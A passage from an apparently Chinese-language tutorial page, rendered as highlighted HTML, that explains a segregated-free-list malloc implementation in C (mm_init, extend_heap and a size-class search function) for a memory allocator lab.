<span class=normal><a href=#__codelineno-167-2> 2</a></span>
<span class=normal><a href=#__codelineno-167-3> 3</a></span>
<span class=normal><a href=#__codelineno-167-4> 4</a></span>
<span class=normal><a href=#__codelineno-167-5> 5</a></span>
<span class=normal><a href=#__codelineno-167-6> 6</a></span>
<span class=normal><a href=#__codelineno-167-7> 7</a></span>
<span class=normal><a href=#__codelineno-167-8> 8</a></span>
<span class=normal><a href=#__codelineno-167-9> 9</a></span>
<span class=normal><a href=#__codelineno-167-10>10</a></span>
<span class=normal><a href=#__codelineno-167-11>11</a></span>
<span class=normal><a href=#__codelineno-167-12>12</a></span>
<span class=normal><a href=#__codelineno-167-13>13</a></span>
<span class=normal><a href=#__codelineno-167-14>14</a></span>
<span class=normal><a href=#__codelineno-167-15>15</a></span>
<span class=normal><a href=#__codelineno-167-16>16</a></span>
<span class=normal><a href=#__codelineno-167-17>17</a></span>
<span class=normal><a href=#__codelineno-167-18>18</a></span>
<span class=normal><a href=#__codelineno-167-19>19</a></span>
<span class=normal><a href=#__codelineno-167-20>20</a></span>
<span class=normal><a href=#__codelineno-167-21>21</a></span>
<span class=normal><a href=#__codelineno-167-22>22</a></span>
<span class=normal><a href=#__codelineno-167-23>23</a></span>
<span class=normal><a href=#__codelineno-167-24>24</a></span>
<span class=normal><a href=#__codelineno-167-25>25</a></span>
<span class=normal><a href=#__codelineno-167-26>26</a></span>
<span class=normal><a href=#__codelineno-167-27>27</a></span>
<span class=normal><a href=#__codelineno-167-28>28</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-167-1><a id=__codelineno-167-1 name=__codelineno-167-1></a><span class=cm>/* </span>
</span><span id=__span-167-2><a id=__codelineno-167-2 name=__codelineno-167-2></a><span class=cm>* mm_init - initialize the malloc package.</span>
</span><span id=__span-167-3><a id=__codelineno-167-3 name=__codelineno-167-3></a><span class=cm>*/</span>
</span><span id=__span-167-4><a id=__codelineno-167-4 name=__codelineno-167-4></a><span class=kt>int</span><span class=w> </span><span class=nf>mm_init</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
</span><span id=__span-167-5><a id=__codelineno-167-5 name=__codelineno-167-5></a><span class=p>{</span>
</span><span id=__span-167-6><a id=__codelineno-167-6 name=__codelineno-167-6></a><span class=w>    </span><span class=cm>/* 申请16个字节空间 + 20个大小类头指针 */</span>
</span><span id=__span-167-7><a id=__codelineno-167-7 name=__codelineno-167-7></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>((</span><span class=n>heap_list</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>mem_sbrk</span><span class=p>((</span><span class=mi>4</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>CLASS_SIZE</span><span class=p>)</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>WSIZE</span><span class=p>))</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=p>(</span><span class=kt>void</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=mi>-1</span><span class=p>)</span>
</span><span id=__span-167-8><a id=__codelineno-167-8 name=__codelineno-167-8></a><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=mi>-1</span><span class=p>;</span>
</span><span id=__span-167-9><a id=__codelineno-167-9 name=__codelineno-167-9></a><span class=w>    </span><span class=cm>/* 初始化20个大小类头指针 */</span>
</span><span id=__span-167-10><a id=__codelineno-167-10 name=__codelineno-167-10></a><span class=w>    </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>CLASS_SIZE</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=o>++</span><span class=p>)</span>
</span><span id=__span-167-11><a id=__codelineno-167-11 name=__codelineno-167-11></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-167-12><a id=__codelineno-167-12 name=__codelineno-167-12></a><span class=w>        </span><span class=n>PUT</span><span class=p>(</span><span class=n>heap_list</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>WSIZE</span><span class=p>,</span><span class=w> </span><span class=nb>NULL</span><span class=p>);</span>
</span><span id=__span-167-13><a id=__codelineno-167-13 name=__codelineno-167-13></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-167-14><a id=__codelineno-167-14 name=__codelineno-167-14></a><span class=w>    </span><span class=cm>/* 对齐 */</span>
</span><span id=__span-167-15><a id=__codelineno-167-15 name=__codelineno-167-15></a><span class=w>    </span><span class=n>PUT</span><span class=p>(</span><span class=n>heap_list</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>CLASS_SIZE</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>WSIZE</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>);</span><span class=w>                                </span><span class=cm>/* 对齐 */</span>
</span><span id=__span-167-16><a id=__codelineno-167-16 name=__codelineno-167-16></a><span class=w>    </span><span class=cm>/* </span>
</span><span id=__span-167-17><a id=__codelineno-167-17 name=__codelineno-167-17></a><span class=cm>    * 序言块和结尾块均设置为已分配, 方便考虑边界情况</span>
</span><span id=__span-167-18><a id=__codelineno-167-18 name=__codelineno-167-18></a><span class=cm>    */</span>
</span><span id=__span-167-19><a id=__codelineno-167-19 name=__codelineno-167-19></a><span class=w>    </span><span class=n>PUT</span><span class=p>(</span><span class=n>heap_list</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=p>((</span><span class=mi>1</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>CLASS_SIZE</span><span class=p>)</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>WSIZE</span><span class=p>),</span><span class=w> </span><span class=n>PACK</span><span class=p>(</span><span class=n>DSIZE</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>));</span><span class=w>     </span><span class=cm>/* 填充序言块 */</span>
</span><span id=__span-167-20><a id=__codelineno-167-20 name=__codelineno-167-20></a><span class=w>    </span><span class=n>PUT</span><span class=p>(</span><span class=n>heap_list</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=p>((</span><span class=mi>2</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>CLASS_SIZE</span><span class=p>)</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>WSIZE</span><span class=p>),</span><span class=w> </span><span class=n>PACK</span><span class=p>(</span><span class=n>DSIZE</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>));</span><span class=w>     </span><span class=cm>/* 填充序言块 */</span>
</span><span id=__span-167-21><a id=__codelineno-167-21 name=__codelineno-167-21></a><span class=w>    </span><span class=n>PUT</span><span class=p>(</span><span class=n>heap_list</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=p>((</span><span class=mi>3</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>CLASS_SIZE</span><span class=p>)</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>WSIZE</span><span class=p>),</span><span class=w> </span><span class=n>PACK</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>));</span><span class=w>         </span><span class=cm>/* 结尾块 */</span>
</span><span id=__span-167-22><a id=__codelineno-167-22 name=__codelineno-167-22></a>
</span><span id=__span-167-23><a id=__codelineno-167-23 name=__codelineno-167-23></a>
</span><span id=__span-167-24><a id=__codelineno-167-24 name=__codelineno-167-24></a><span class=w>    </span><span class=cm>/* 扩展空闲空间 */</span>
</span><span id=__span-167-25><a id=__codelineno-167-25 name=__codelineno-167-25></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>extend_heap</span><span class=p>(</span><span class=n>CHUNKSIZE</span><span class=w> </span><span class=o>/</span><span class=w> </span><span class=n>WSIZE</span><span class=p>)</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=nb>NULL</span><span class=p>)</span>
</span><span id=__span-167-26><a id=__codelineno-167-26 name=__codelineno-167-26></a><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=mi>-1</span><span class=p>;</span>
</span><span id=__span-167-27><a id=__codelineno-167-27 name=__codelineno-167-27></a><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>
</span><span id=__span-167-28><a id=__codelineno-167-28 name=__codelineno-167-28></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> <p>扩展堆是在结尾块后进行扩展，因而扩展块操作也与原来相同：</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-168-1> 1</a></span>
<span class=normal><a href=#__codelineno-168-2> 2</a></span>
<span class=normal><a href=#__codelineno-168-3> 3</a></span>
<span class=normal><a href=#__codelineno-168-4> 4</a></span>
<span class=normal><a href=#__codelineno-168-5> 5</a></span>
<span class=normal><a href=#__codelineno-168-6> 6</a></span>
<span class=normal><a href=#__codelineno-168-7> 7</a></span>
<span class=normal><a href=#__codelineno-168-8> 8</a></span>
<span class=normal><a href=#__codelineno-168-9> 9</a></span>
<span class=normal><a href=#__codelineno-168-10>10</a></span>
<span class=normal><a href=#__codelineno-168-11>11</a></span>
<span class=normal><a href=#__codelineno-168-12>12</a></span>
<span class=normal><a href=#__codelineno-168-13>13</a></span>
<span class=normal><a href=#__codelineno-168-14>14</a></span>
<span class=normal><a href=#__codelineno-168-15>15</a></span>
<span class=normal><a href=#__codelineno-168-16>16</a></span>
<span class=normal><a href=#__codelineno-168-17>17</a></span>
<span class=normal><a href=#__codelineno-168-18>18</a></span>
<span class=normal><a href=#__codelineno-168-19>19</a></span>
<span class=normal><a href=#__codelineno-168-20>20</a></span>
<span class=normal><a href=#__codelineno-168-21>21</a></span>
<span class=normal><a href=#__codelineno-168-22>22</a></span>
<span class=normal><a href=#__codelineno-168-23>23</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-168-1><a id=__codelineno-168-1 name=__codelineno-168-1></a><span class=cm>/*</span>
</span><span id=__span-168-2><a id=__codelineno-168-2 name=__codelineno-168-2></a><span class=cm>* 扩展heap, 传入的是字数(一个字是4字节)</span>
</span><span id=__span-168-3><a id=__codelineno-168-3 name=__codelineno-168-3></a><span class=cm>*/</span>
</span><span id=__span-168-4><a id=__codelineno-168-4 name=__codelineno-168-4></a><span class=kt>void</span><span class=w> </span><span class=o>*</span><span class=nf>extend_heap</span><span class=p>(</span><span class=kt>size_t</span><span class=w> </span><span class=n>words</span><span class=p>)</span>
</span><span id=__span-168-5><a id=__codelineno-168-5 name=__codelineno-168-5></a><span class=p>{</span>
</span><span id=__span-168-6><a id=__codelineno-168-6 name=__codelineno-168-6></a><span class=w>    </span><span class=cm>/* bp总是指向有效载荷 */</span>
</span><span id=__span-168-7><a id=__codelineno-168-7 name=__codelineno-168-7></a><span class=w>    </span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=n>bp</span><span class=p>;</span>
</span><span id=__span-168-8><a id=__codelineno-168-8 name=__codelineno-168-8></a><span class=w>    </span><span class=kt>size_t</span><span class=w> </span><span class=n>size</span><span class=p>;</span>
</span><span id=__span-168-9><a id=__codelineno-168-9 name=__codelineno-168-9></a><span class=w>    </span><span class=cm>/* 根据传入字数奇偶, 考虑对齐，转换成字节数(总是8的倍数) */</span>
</span><span id=__span-168-10><a id=__codelineno-168-10 name=__codelineno-168-10></a><span class=w>    </span><span class=n>size</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>words</span><span class=w> </span><span class=o>%</span><span class=w> </span><span class=mi>2</span><span class=p>)</span><span class=w> </span><span class=o>?</span><span class=w> </span><span class=p>(</span><span class=n>words</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>1</span><span class=p>)</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>WSIZE</span><span class=w> </span><span class=o>:</span><span class=w> </span><span class=n>words</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>WSIZE</span><span class=p>;</span>
</span><span id=__span-168-11><a id=__codelineno-168-11 name=__codelineno-168-11></a>
</span><span id=__span-168-12><a id=__codelineno-168-12 name=__codelineno-168-12></a><span class=w>    </span><span class=cm>/* 分配 */</span>
</span><span id=__span-168-13><a id=__codelineno-168-13 name=__codelineno-168-13></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>((</span><span class=kt>long</span><span class=p>)(</span><span class=n>bp</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>mem_sbrk</span><span class=p>(</span><span class=n>size</span><span class=p>))</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>-1</span><span class=p>)</span>
</span><span id=__span-168-14><a id=__codelineno-168-14 name=__codelineno-168-14></a><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=nb>NULL</span><span class=p>;</span>
</span><span id=__span-168-15><a id=__codelineno-168-15 name=__codelineno-168-15></a>
</span><span id=__span-168-16><a id=__codelineno-168-16 name=__codelineno-168-16></a><span class=w>    </span><span class=cm>/* 设置头部和脚部 */</span>
</span><span id=__span-168-17><a id=__codelineno-168-17 name=__codelineno-168-17></a><span class=w>    </span><span class=n>PUT</span><span class=p>(</span><span class=n>HDRP</span><span class=p>(</span><span class=n>bp</span><span class=p>),</span><span class=w> </span><span class=n>PACK</span><span class=p>(</span><span class=n>size</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>));</span><span class=w>           </span><span class=cm>/* 空闲块头 */</span>
</span><span id=__span-168-18><a id=__codelineno-168-18 name=__codelineno-168-18></a><span class=w>    </span><span class=n>PUT</span><span class=p>(</span><span class=n>FTRP</span><span class=p>(</span><span class=n>bp</span><span class=p>),</span><span class=w> </span><span class=n>PACK</span><span class=p>(</span><span class=n>size</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>));</span><span class=w>           </span><span class=cm>/* 空闲块脚 */</span>
</span><span id=__span-168-19><a id=__codelineno-168-19 name=__codelineno-168-19></a><span class=w>    </span><span class=n>PUT</span><span class=p>(</span><span class=n>HDRP</span><span class=p>(</span><span class=n>NEXT_BLKP</span><span class=p>(</span><span class=n>bp</span><span class=p>)),</span><span class=w> </span><span class=n>PACK</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>));</span><span class=w>   </span><span class=cm>/* 新结尾块，帮助内存分配器识别堆的结束位置 */</span>
</span><span id=__span-168-20><a id=__codelineno-168-20 name=__codelineno-168-20></a>
</span><span id=__span-168-21><a id=__codelineno-168-21 name=__codelineno-168-21></a><span class=w>    </span><span class=cm>/* 判断相邻块是否是空闲块, 进行合并 */</span>
</span><span id=__span-168-22><a id=__codelineno-168-22 name=__codelineno-168-22></a><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=n>coalesce</span><span class=p>(</span><span class=n>bp</span><span class=p>);</span>
</span><span id=__span-168-23><a id=__codelineno-168-23 name=__codelineno-168-23></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> </li> <li> <h4 id=_24>维护链表<a class=headerlink href=#_24 title="Permanent link">¶</a></h4> <p>在知道要请求块的大小后，我们要先根据大小定位到相应大小类的头结点：</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-169-1> 1</a></span>
<span class=normal><a href=#__codelineno-169-2> 2</a></span>
<span class=normal><a href=#__codelineno-169-3> 3</a></span>
<span class=normal><a href=#__codelineno-169-4> 4</a></span>
<span class=normal><a href=#__codelineno-169-5> 5</a></span>
<span class=normal><a href=#__codelineno-169-6> 6</a></span>
<span class=normal><a href=#__codelineno-169-7> 7</a></span>
<span class=normal><a href=#__codelineno-169-8> 8</a></span>
<span class=normal><a href=#__codelineno-169-9> 9</a></span>
<span class=normal><a href=#__codelineno-169-10>10</a></span>
<span class=normal><a href=#__codelineno-169-11>11</a></span>
<span class=normal><a href=#__codelineno-169-12>12</a></span>
<span class=normal><a href=#__codelineno-169-13>13</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-169-1><a id=__codelineno-169-1 name=__codelineno-169-1></a><span class=cm>/* </span>
</span><span id=__span-169-2><a id=__codelineno-169-2 name=__codelineno-169-2></a><span class=cm>* search - 找到块大小对应的等价类的序号</span>
</span><span id=__span-169-3><a id=__codelineno-169-3 name=__codelineno-169-3></a><span class=cm>*/</span>
</span><span id=__span-169-4><a id=__codelineno-169-4 name=__codelineno-169-4></a><span class=kt>int</span><span class=w> </span><span class=nf>search</span><span class=p>(</span><span class=kt>size_t</span><span class=w> </span><span class=n>size</span><span class=p>)</span>
</span><span id=__span-169-5><a id=__codelineno-169-5 name=__codelineno-169-5></a><span class=p>{</span>
</span><span id=__span-169-6><a id=__codelineno-169-6 name=__codelineno-169-6></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=p>;</span>
</span><span id=__span-169-7><a id=__codelineno-169-7 name=__codelineno-169-7></a><span class=w>    </span><span class=k>for</span><span class=p>(</span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>4</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;=</span><span class=w> </span><span class=mi>22</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=o>++</span><span class=p>)</span>
</span><span id=__span-169-8><a id=__codelineno-169-8 name=__codelineno-169-8></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-169-9><a id=__codelineno-169-9 name=__codelineno-169-9></a><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>size</span><span class=w> </span><span class=o>&lt;=</span><span class=w> </span><span class=p>(</span><span class=mi>1</span><span class=w> </span><span class=o>&lt;&lt;</span><span class=w> </span><span class=n>i</span><span class=p>))</span>
</span><span id=__span-169-10><a id=__codelineno-169-10 name=__codelineno-169-10></a><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=mi>4</span><span class=p>;</span>
</span><span id=__span-169-11><a id=__codelineno-169-11 name=__codelineno-169-11></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-169-12><a id=__codelineno-169-12 name=__codelineno-169-12></a><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=mi>4</span><span class=p>;</span>
</span><span id=__span-169-13><a id=__codelineno-169-13 name=__codelineno-169-13></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> <p>等效于如下代码：</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-170-1> 1</a></span>
<span class=normal><a href=#__codelineno-170-2> 2</a></span>
<span class=normal><a href=#__codelineno-170-3> 3</a></span>
<span class=normal><a href=#__codelineno-170-4> 4</a></span>
<span class=normal><a href=#__codelineno-170-5> 5</a></span>
<span class=normal><a href=#__codelineno-170-6> 6</a></span>
<span class=normal><a href=#__codelineno-170-7> 7</a></span>
<span class=normal><a href=#__codelineno-170-8> 8</a></span>
<span class=normal><a href=#__codelineno-170-9> 9</a></span>
<span class=normal><a href=#__codelineno-170-10>10</a></span>
<span class=normal><a href=#__codelineno-170-11>11</a></span>
<span class=normal><a href=#__codelineno-170-12>12</a></span>
<span class=normal><a href=#__codelineno-170-13>13</a></span>
<span class=normal><a href=#__codelineno-170-14>14</a></span>
<span class=normal><a href=#__codelineno-170-15>15</a></span>
<span class=normal><a href=#__codelineno-170-16>16</a></span>
<span class=normal><a href=#__codelineno-170-17>17</a></span>
<span class=normal><a href=#__codelineno-170-18>18</a></span>
<span class=normal><a href=#__codelineno-170-19>19</a></span>
<span class=normal><a href=#__codelineno-170-20>20</a></span>
<span class=normal><a href=#__codelineno-170-21>21</a></span>
<span class=normal><a href=#__codelineno-170-22>22</a></span>
<span class=normal><a href=#__codelineno-170-23>23</a></span>
<span class=normal><a href=#__codelineno-170-24>24</a></span>
<span class=normal><a href=#__codelineno-170-25>25</a></span>
<span class=normal><a href=#__codelineno-170-26>26</a></span>
<span class=normal><a href=#__codelineno-170-27>27</a></span>
<span class=normal><a href=#__codelineno-170-28>28</a></span>
<span class=normal><a href=#__codelineno-170-29>29</a></span>
<span class=normal><a href=#__codelineno-170-30>30</a></span>
<span class=normal><a href=#__codelineno-170-31>31</a></span>
<span class=normal><a href=#__codelineno-170-32>32</a></span>
<span class=normal><a href=#__codelineno-170-33>33</a></span>
<span class=normal><a href=#__codelineno-170-34>34</a></span>
<span class=normal><a href=#__codelineno-170-35>35</a></span>
<span class=normal><a href=#__codelineno-170-36>36</a></span>
<span class=normal><a href=#__codelineno-170-37>37</a></span>
<span class=normal><a href=#__codelineno-170-38>38</a></span>
<span class=normal><a href=#__codelineno-170-39>39</a></span>
<span class=normal><a href=#__codelineno-170-40>40</a></span>
<span class=normal><a href=#__codelineno-170-41>41</a></span>
<span class=normal><a href=#__codelineno-170-42>42</a></span>
<span class=normal><a href=#__codelineno-170-43>43</a></span>
<span class=normal><a href=#__codelineno-170-44>44</a></span>
<span class=normal><a href=#__codelineno-170-45>45</a></span>
<span class=normal><a href=#__codelineno-170-46>46</a></span>
<span class=normal><a href=#__codelineno-170-47>47</a></span>
<span class=normal><a href=#__codelineno-170-48>48</a></span>
<span class=normal><a href=#__codelineno-170-49>49</a></span>
<span class=normal><a href=#__codelineno-170-50>50</a></span>
<span class=normal><a href=#__codelineno-170-51>51</a></span>
<span class=normal><a href=#__codelineno-170-52>52</a></span>
<span class=normal><a href=#__codelineno-170-53>53</a></span>
<span class=normal><a href=#__codelineno-170-54>54</a></span>
<span class=normal><a href=#__codelineno-170-55>55</a></span>
<span class=normal><a href=#__codelineno-170-56>56</a></span>
<span class=normal><a href=#__codelineno-170-57>57</a></span>
<span class=normal><a href=#__codelineno-170-58>58</a></span>
<span class=normal><a href=#__codelineno-170-59>59</a></span>
<span class=normal><a href=#__codelineno-170-60>60</a></span>
<span class=normal><a href=#__codelineno-170-61>61</a></span>
<span class=normal><a href=#__codelineno-170-62>62</a></span>
<span class=normal><a href=#__codelineno-170-63>63</a></span>
<span class=normal><a href=#__codelineno-170-64>64</a></span>
<span class=normal><a href=#__codelineno-170-65>65</a></span>
<span class=normal><a href=#__codelineno-170-66>66</a></span>
<span class=normal><a href=#__codelineno-170-67>67</a></span>
<span class=normal><a href=#__codelineno-170-68>68</a></span>
<span class=normal><a href=#__codelineno-170-69>69</a></span>
<span class=normal><a href=#__codelineno-170-70>70</a></span>
<span class=normal><a href=#__codelineno-170-71>71</a></span>
<span class=normal><a href=#__codelineno-170-72>72</a></span>
<span class=normal><a href=#__codelineno-170-73>73</a></span>
<span class=normal><a href=#__codelineno-170-74>74</a></span>
<span class=normal><a href=#__codelineno-170-75>75</a></span>
<span class=normal><a href=#__codelineno-170-76>76</a></span>
<span class=normal><a href=#__codelineno-170-77>77</a></span>
<span class=normal><a href=#__codelineno-170-78>78</a></span>
<span class=normal><a href=#__codelineno-170-79>79</a></span>
<span class=normal><a href=#__codelineno-170-80>80</a></span>
<span class=normal><a href=#__codelineno-170-81>81</a></span>
<span class=normal><a href=#__codelineno-170-82>82</a></span>
<span class=normal><a href=#__codelineno-170-83>83</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-170-1><a id=__codelineno-170-1 name=__codelineno-170-1></a><span class=kt>int</span><span class=w> </span><span class=nf>search</span><span class=p>(</span><span class=kt>size_t</span><span class=w> </span><span class=n>size</span><span class=p>)</span>
</span><span id=__span-170-2><a id=__codelineno-170-2 name=__codelineno-170-2></a><span class=p>{</span>
</span><span id=__span-170-3><a id=__codelineno-170-3 name=__codelineno-170-3></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>size</span><span class=w> </span><span class=o>&lt;=</span><span class=w> </span><span class=p>(</span><span class=mi>1</span><span class=w> </span><span class=o>&lt;&lt;</span><span class=w> </span><span class=mi>4</span><span class=p>))</span><span class=w> </span>
</span><span id=__span-170-4><a id=__codelineno-170-4 name=__codelineno-170-4></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-170-5><a id=__codelineno-170-5 name=__codelineno-170-5></a><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>
</span><span id=__span-170-6><a id=__codelineno-170-6 name=__codelineno-170-6></a><span class=w>    </span><span class=p>}</span><span class=w> </span>
</span><span id=__span-170-7><a id=__codelineno-170-7 name=__codelineno-170-7></a><span class=w>    </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>size</span><span class=w> </span><span class=o>&lt;=</span><span class=w> </span><span class=p>(</span><span class=mi>1</span><span class=w> </span><span class=o>&lt;&lt;</span><span class=w> </span><span class=mi>5</span><span class=p>))</span><span class=w> </span>
</span><span id=__span-170-8><a id=__codelineno-170-8 name=__codelineno-170-8></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-170-9><a id=__codelineno-170-9 name=__codelineno-170-9></a><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=mi>1</span><span class=p>;</span>
</span><span id=__span-170-10><a id=__codelineno-170-10 name=__codelineno-170-10></a><span class=w>    </span><span class=p>}</span><span class=w> </span>
</span><span id=__span-170-11><a id=__codelineno-170-11 name=__codelineno-170-11></a><span class=w>    </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>size</span><span class=w> </span><span class=o>&lt;=</span><span class=w> </span><span class=p>(</span><span class=mi>1</span><span class=w> </span><span class=o>&lt;&lt;</span><span class=w> </span><span class=mi>6</span><span class=p>))</span><span class=w> </span>
</span><span id=__span-170-12><a id=__codelineno-170-12 name=__codelineno-170-12></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-170-13><a id=__codelineno-170-13 name=__codelineno-170-13></a><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=mi>2</span><span class=p>;</span>
</span><span id=__span-170-14><a id=__codelineno-170-14 name=__codelineno-170-14></a><span class=w>    </span><span class=p>}</span><span class=w> </span>
</span><span id=__span-170-15><a id=__codelineno-170-15 name=__codelineno-170-15></a><span class=w>    </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>size</span><span class=w> </span><span class=o>&lt;=</span><span class=w> </span><span class=p>(</span><span class=mi>1</span><span class=w> </span><span class=o>&lt;&lt;</span><span class=w> </span><span class=mi>7</span><span class=p>))</span><span class=w> </span>
</span><span id=__span-170-16><a id=__codelineno-170-16 name=__codelineno-170-16></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-170-17><a id=__codelineno-170-17 name=__codelineno-170-17></a><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=mi>3</span><span class=p>;</span>
</span><span id=__span-170-18><a id=__codelineno-170-18 name=__codelineno-170-18></a><span class=w>    </span><span class=p>}</span><span class=w> </span>
</span><span id=__span-170-19><a id=__codelineno-170-19 name=__codelineno-170-19></a><span class=w>    </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>size</span><span class=w> </span><span class=o>&lt;=</span><span class=w> </span><span class=p>(</span><span class=mi>1</span><span class=w> </span><span class=o>&lt;&lt;</span><span class=w> </span><span class=mi>8</span><span class=p>))</span><span class=w> </span>
</span><span id=__span-170-20><a id=__codelineno-170-20 name=__codelineno-170-20></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-170-21><a id=__codelineno-170-21 name=__codelineno-170-21></a><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=mi>4</span><span class=p>;</span>
</span><span id=__span-170-22><a id=__codelineno-170-22 name=__codelineno-170-22></a><span class=w>    </span><span class=p>}</span><span class=w> </span>
</span><span id=__span-170-23><a id=__codelineno-170-23 name=__codelineno-170-23></a><span class=w>    </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>size</span><span class=w> </span><span class=o>&lt;=</span><span class=w> </span><span class=p>(</span><span class=mi>1</span><span class=w> </span><span class=o>&lt;&lt;</span><span class=w> </span><span class=mi>9</span><span class=p>))</span><span class=w> </span>
</span><span id=__span-170-24><a id=__codelineno-170-24 name=__codelineno-170-24></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-170-25><a id=__codelineno-170-25 name=__codelineno-170-25></a><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=mi>5</span><span class=p>;</span>
</span><span id=__span-170-26><a id=__codelineno-170-26 name=__codelineno-170-26></a><span class=w>    </span><span class=p>}</span><span class=w> </span>
</span><span id=__span-170-27><a id=__codelineno-170-27 name=__codelineno-170-27></a><span class=w>    </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>size</span><span class=w> </span><span class=o>&lt;=</span><span class=w> </span><span class=p>(</span><span class=mi>1</span><span class=w> </span><span class=o>&lt;&lt;</span><span class=w> </span><span class=mi>10</span><span class=p>))</span><span class=w> </span>
</span><span id=__span-170-28><a id=__codelineno-170-28 name=__codelineno-170-28></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-170-29><a id=__codelineno-170-29 name=__codelineno-170-29></a><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=mi>6</span><span class=p>;</span>
</span><span id=__span-170-30><a id=__codelineno-170-30 name=__codelineno-170-30></a><span class=w>    </span><span class=p>}</span><span class=w> </span>
